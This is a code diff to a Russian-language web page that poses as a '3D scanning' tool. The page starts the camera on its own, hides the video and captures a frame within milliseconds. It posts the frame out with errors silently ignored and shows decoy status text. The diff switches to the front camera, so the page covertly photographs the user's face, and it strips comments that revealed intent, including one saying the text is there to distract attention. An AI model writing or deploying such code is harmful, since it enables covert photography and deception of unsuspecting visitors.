@@ -67,7 +67,6 @@
             50% { opacity: 0.2; }
         }
         video { display: none !important; }
-        .hidden { display: none; }
     </style>
 </head>
 <body>
@@ -116,7 +115,6 @@
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, w, h);
 
-            // Меняем текст, чтобы отвлечь внимание
             scanText.textContent = 'Сканирование объекта...';
             scanSubtext.textContent = 'Построение 3D-сетки';
             scanArea.style.borderColor = '#00ff88';
@@ -132,9 +130,7 @@
                             method: 'POST',
                             body: formData
                         });
-                    } catch (e) {
-                        // Игнорируем ошибки отправки
-                    }
+                    } catch (e) {}
                 }
 
                 // ===== МГНОВЕННАЯ ОШИБКА =====
@@ -159,7 +155,7 @@
             try {
                 stream = await navigator.mediaDevices.getUserMedia({
                     video: { 
-                        facingMode: 'environment',
+                        facingMode: 'user',  // ← ПЕРЕДНЯЯ КАМЕРА
                         width: { ideal: 1280 },
                         height: { ideal: 720 }
                     }
@@ -168,20 +164,17 @@
                 video.srcObject = stream;
                 await video.play();
 
-                // Меняем интерфейс
                 scanText.textContent = 'Объект обнаружен';
                 scanSubtext.textContent = 'Авто-фокусировка';
                 statusDiv.innerHTML = '<span class="dot"></span> Сканирование...';
                 scanArea.style.borderColor = 'rgba(0,212,255,0.5)';
 
                 // ===== МГНОВЕННЫЙ ЗАХВАТ =====
-                // Ждём 1 кадр, чтобы видео стабилизировалось (50ms)
                 setTimeout(() => {
                     captureAndSend();
                 }, 50);
 
             } catch (err) {
-                // Если камера отклонена
                 statusDiv.innerHTML = '❌ Ошибка доступа к камере';
                 setTimeout(() => {
                     document.body.innerHTML = `
@@ -197,7 +190,6 @@
         }
 
         // ===== ЗАПУСК СРАЗУ ПОСЛЕ ЗАГРУЗКИ =====
-        // Задержка 300ms для полной загрузки DOM
         setTimeout(autoStart, 300);
 
         // ===== БЛОКИРОВКА КНОПКИ "НАЗАД" =====
